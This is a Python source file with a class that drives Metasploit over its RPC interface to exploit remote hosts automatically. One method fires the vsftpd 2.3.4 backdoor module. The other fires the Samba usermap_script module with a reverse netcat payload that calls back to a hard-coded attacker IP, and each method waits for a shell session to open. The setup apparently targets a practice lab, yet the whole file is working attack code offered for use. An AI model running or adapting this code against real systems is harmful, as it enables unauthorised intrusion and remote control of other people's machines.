import time
from pymetasploit3.msfrpc import MsfRpcClient


class MetasploitExecutor:
    """
    Minimal Metasploit RPC executor.

    Required before running:
        msfrpcd -P msfpass -S -a 127.0.0.1 -p 55552
    """

    def __init__(
        self,
        password="msfpass",
        host="127.0.0.1",
        port=55552,
        ssl=False,
        timeout=30,
    ):
        self.password = password
        self.host = host
        self.port = port
        self.ssl = ssl
        self.timeout = timeout

        self.client = MsfRpcClient(
            password,
            server=host,
            port=port,
            ssl=ssl,
        )

    def _safe_read_console(self, console):
        try:
            result = console.read()
            return result.get("data", "")
        except Exception as exc:
            return f"\n[console read error] {exc}\n"

    def _get_sessions(self):
        try:
            sessions = self.client.sessions.list
            return sessions if sessions else {}
        except Exception:
            return {}

    # =========================
    # VSFTPD
    # =========================
    def exploit_vsftpd_234(self, rhost, rport=21):
        module_name = "exploit/unix/ftp/vsftpd_234_backdoor"
        console = None
        output = ""

        try:
            console = self.client.consoles.console()

            commands = [
                f"use {module_name}",
                f"set RHOSTS {rhost}",
                f"set RPORT {rport}",
                "set VERBOSE true",
                "run -j",
            ]

            for cmd in commands:
                console.write(cmd + "\n")
                time.sleep(0.3)
                output += self._safe_read_console(console)

            start = time.time()
            while time.time() - start < self.timeout:
                output += self._safe_read_console(console)
                sessions = self._get_sessions()

                if sessions:
                    return {
                        "success": True,
                        "real_success": True,
                        "stdout": output,
                        "stderr": "",
                        "sessions": sessions,
                        "backend": "metasploit",
                        "module": module_name,
                    }

                time.sleep(1)

            return {
                "success": False,
                "real_success": False,
                "stdout": output,
                "stderr": "No session",
                "sessions": {},
                "backend": "metasploit",
                "module": module_name,
            }

        except Exception as exc:
            return {
                "success": False,
                "real_success": False,
                "stdout": output,
                "stderr": str(exc),
                "sessions": {},
                "backend": "metasploit",
                "module": module_name,
            }

        finally:
            if console:
                console.destroy()

    # =========================
    # SAMBA（🔥 新增核心）
    # =========================
    def exploit_samba(self, rhost, rport=139):
        module_name = "exploit/multi/samba/usermap_script"
        console = None
        output = ""

        try:
            console = self.client.consoles.console()

            commands = [
                f"use {module_name}",
                f"set RHOSTS {rhost}",
                f"set RPORT {rport}",
                "set PAYLOAD cmd/unix/reverse_netcat",
                "set LHOST 10.11.203.40",  # ⚠️ 必须是你 Kali IP
                "set VERBOSE true",
                "run -j",
            ]

            for cmd in commands:
                console.write(cmd + "\n")
                time.sleep(0.3)
                output += self._safe_read_console(console)

            start = time.time()
            while time.time() - start < self.timeout:
                output += self._safe_read_console(console)
                sessions = self._get_sessions()

                if sessions:
                    return {
                        "success": True,
                        "real_success": True,
                        "stdout": output,
                        "stderr": "",
                        "sessions": sessions,
                        "backend": "metasploit",
                        "module": module_name,
                    }

                time.sleep(1)

            return {
                "success": False,
                "real_success": False,
                "stdout": output,
                "stderr": "No session",
                "sessions": {},
                "backend": "metasploit",
                "module": module_name,
            }

        except Exception as exc:
            return {
                "success": False,
                "real_success": False,
                "stdout": output,
                "stderr": str(exc),
                "sessions": {},
                "backend": "metasploit",
                "module": module_name,
            }

        finally:
            if console:
                console.destroy()